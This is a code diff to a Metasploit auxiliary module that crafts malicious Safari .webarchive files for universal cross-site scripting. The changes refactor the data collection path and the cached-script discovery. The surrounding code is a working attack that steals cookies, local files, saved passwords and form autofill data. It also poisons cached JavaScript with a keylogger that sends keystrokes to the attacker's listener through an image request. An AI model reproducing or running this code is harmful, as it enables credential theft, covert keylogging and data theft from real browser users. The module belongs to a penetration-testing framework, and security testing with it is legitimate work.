@@ -24,8 +24,9 @@ class Metasploit3 < Msf::Auxiliary
 				in Safari's .webarchive file format. The format allows you to
 				specify both domain and content, so we can run arbitrary script in the
 				context of any domain. This allows us to steal cookies, file URLs, and saved
-				passwords from any website we want. On sites that link to cached javascripts,
-				we can poison the user's browser cache and install keyloggers.
+				passwords from any website we want -- in other words, it is a universal
+				cross-site scripting vector (UXSS). On sites that link to cached javascripts,
+				we can additionally poison user's browser cache and install keyloggers.
 			},
 			'License'        => MSF_LICENSE,
 			'Author'         => 'joev',
@@ -47,16 +48,14 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptString.new('FILENAME', [ true, 'The file name.',  'msf.webarchive']),
-				OptString.new('URLS', [ true, 'The URLs to steal cookie and form data from.', '']),
+				OptString.new('URLS', [ true, 'A space-delimited list of URLs to UXSS (eg http//browserscan.rapid7.com/']),
+				OptString.new('URIPATH', [false, 'The URI to receive the UXSS\'ed data', '/grab']),
 				OptString.new('FILE_URLS', [false, 'Additional file:// URLs to steal.', '']),
 				OptBool.new('STEAL_COOKIES', [true, "Enable cookie stealing.", true]),
 				OptBool.new('STEAL_FILES', [true, "Enable local file stealing.", true]),
-				OptBool.new('INSTALL_KEYLOGGERS', [true, "Attempt to poison the user's cache "+
-				                                         "with a javascript keylogger.", true]),
+				OptBool.new('INSTALL_KEYLOGGERS', [true, "Attempt to poison the user's cache with a javascript keylogger.", true]),
 				OptBool.new('STEAL_FORM_DATA', [true, "Enable form autofill stealing.", true]),
-				
-				OptBool.new('ENABLE_POPUPS', [false, "Enable the popup window fallback method for"+
-																						" stealing form data.", true])
+				OptBool.new('ENABLE_POPUPS', [false, "Enable the popup window fallback method for stealing form data.", true])
 			],
 			self.class)
 	end
@@ -76,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
 		super
 		# clear my resource, deregister ref, stop/close the HTTP socket
 		begin
-			@http_service.remove_resource("/grab")
+			@http_service.remove_resource(collect_data_uri)
 			@http_service.deref
 			@http_service.stop
 			@http_service.close
@@ -140,7 +139,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Proc' => Proc.new { |cli, req|
 				on_request_uri(cli, req)
 			},
-			'Path' => "/grab"
+			'Path' => collect_data_uri
 		}.update(opts['Uri'] || {})
 
 		proto = (datastore["SSL"] ? "https" : "http")
@@ -163,7 +162,7 @@ class Metasploit3 < Msf::Auxiliary
 	def on_request_uri(cli, request)
 		begin
 			data = if request.body.size > 0
-				request.body 
+				request.body
 			else
 				request.qstring['data']
 			end
@@ -186,7 +185,7 @@ class Metasploit3 < Msf::Auxiliary
 	def webarchive_header
 		%Q|
 			<?xml version="1.0" encoding="UTF-8"?>
-			<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
+			<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 				"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 			<plist version="1.0">
 			<dict>
@@ -254,7 +253,6 @@ class Metasploit3 < Msf::Auxiliary
 		scripts = scripts_to_poison[url_idx] || []
 		xml_dicts = scripts.map do |script|
 			script_body = inject_js_keylogger(script[:body])
-			puts 
 			%Q|
 			<dict>
 				<key>WebResourceData</key>
@@ -293,8 +291,8 @@ class Metasploit3 < Msf::Auxiliary
 		# this is a binary plist, but im too lazy to write a real encoder.
 		# ripped this straight out of a safari webarchive save.
 		script['content-length'] = script[:body].length
-		whitelist = %w(content-type content-length date etag 
-									 Last-Modified cache-control expires)
+		whitelist = %w(content-type content-length date etag
+										Last-Modified cache-control expires)
 		headers = script.clone.delete_if { |k, v| not whitelist.include? k }
 
 		key_set = headers.keys.sort
@@ -612,7 +610,7 @@ class Metasploit3 < Msf::Auxiliary
 				var iframe = tryInIframe();
 				if (#{should_pop_up?}) {
 					window.setTimeout(function(){
-						
+
 						if (iframe.contentDocument &&
 								iframe.contentDocument.location.href == 'about:blank') {
 							tryInNewWin();
@@ -670,7 +668,7 @@ class Metasploit3 < Msf::Auxiliary
 							data = JSON.stringify({keystrokes: keystrokes, time: time});
 							img.src = '#{backend_url}#{collect_data_uri}?data='+data;
 						}
-						document.addEventListener('keydown', function(e) { 
+						document.addEventListener('keydown', function(e) {
 							var c = String.fromCharCode(e.keyCode);
 							if (c.length > 0) buffer += c;
 						}, true);
@@ -715,24 +713,43 @@ class Metasploit3 < Msf::Auxiliary
 
 	# @return [Array<Array<String>>] list of URLs for remote javascripts that are cacheable
 	def find_cached_scripts
-		cached_scripts = all_script_urls(urls).map do |urls_for_site|
+		cached_scripts = all_script_urls(urls).each_with_index.map do |urls_for_site, i|
+			begin
+				page_uri = URI.parse(urls[i])
+			rescue URI::InvalidURIError => e
+				next
+			end
+
 			results = urls_for_site.uniq.map do |url|
-				print_status "URL: #{url}"
-				io = open url
-				# parse some HTTP headers and do type coercions
-				last_modified = io.last_modified
-				expires = Time.parse(io.meta['expires']) rescue nil
-				cache_control = io.meta['cache-control'] || ''
-				charset = io.charset
-				etag = io.meta['etag']
-				# lets see if we are able to "poison" the cache for this asset...
-				if (!expires.nil? && Time.now < expires) or
-					 (cache_control.length > 0) or   # if asset is cacheable
-					 (last_modified.length > 0)
-					print_status("Found cacheable #{url}")
-					io.meta.merge(:body => io.read, :url => url)
-				else
-					nil
+				begin
+					print_status "URL: #{url}"
+					begin
+						script_uri = URI.parse(url)
+						if script_uri.relative?
+							url = page_uri + url
+						end
+						io = open(url)
+					rescue URI::InvalidURIError => e
+						next
+					end
+
+					# parse some HTTP headers and do type coercions
+					last_modified = io.last_modified
+					expires = Time.parse(io.meta['expires']) rescue nil
+					cache_control = io.meta['cache-control'] || ''
+					charset = io.charset
+					etag = io.meta['etag']
+					# lets see if we are able to "poison" the cache for this asset...
+					if (!expires.nil? && Time.now < expires) or
+							(cache_control.length > 0) or   # if asset is cacheable
+							(not last_modified.nil? and last_modified.to_s.length > 0)
+						print_status("Found cacheable #{url}")
+						io.meta.merge(:body => io.read, :url => url)
+					else
+						nil
+					end
+				rescue Errno::ENOENT => e # lots of things can go wrong here.
+					next
 				end
 			end
 			results.compact # remove nils
@@ -745,7 +762,14 @@ class Metasploit3 < Msf::Auxiliary
 
 	# @return [String] the path to send data back to
 	def collect_data_uri
-		"/grab"
+		path = datastore["URIPATH"]
+		if path.nil? or path.empty?
+			'/grab'
+		elsif path =~ /^\//
+			path
+		else
+			"/#{path}"
+		end
 	end
 
 	# @return [String] formatted http/https URL of the listener
@@ -780,9 +804,9 @@ class Metasploit3 < Msf::Auxiliary
 	# @param [String] input the unencoded string
 	# @return [String] input with dangerous chars replaced with xml entities
 	def escape_xml(input)
-		input.gsub("&", "&amp;").gsub("<", "&lt;")
-		     .gsub(">", "&gt;").gsub("'", "&apos;")
-		     .gsub("\"", "&quot;")
+		input.to_s.gsub("&", "&amp;").gsub("<", "&lt;")
+							.gsub(">", "&gt;").gsub("'", "&apos;")
+							.gsub("\"", "&quot;")
 	end
 
 	def should_steal_cookies?
